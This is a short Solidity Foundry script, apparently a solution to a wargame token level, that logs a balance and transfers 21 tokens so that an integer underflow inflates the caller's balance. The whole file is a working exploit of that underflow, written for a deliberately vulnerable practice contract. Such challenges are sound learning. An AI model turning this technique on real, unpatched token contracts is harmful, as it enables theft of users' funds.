// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/level05.sol";

contract AttackerTokenScript is Script {
    Token level05 = Token(vm.envAddress("INSTANCE"));

    function run() external {
        console.log("level05", address(level05));
        console.log("this", address(this));

        vm.startBroadcast();

        console.log("Current balance is :", level05.balanceOf(msg.sender));
        level05.transfer(address(this), 21);
        console.log("New balance is :", level05.balanceOf(msg.sender));

        vm.stopBroadcast();
    }
}
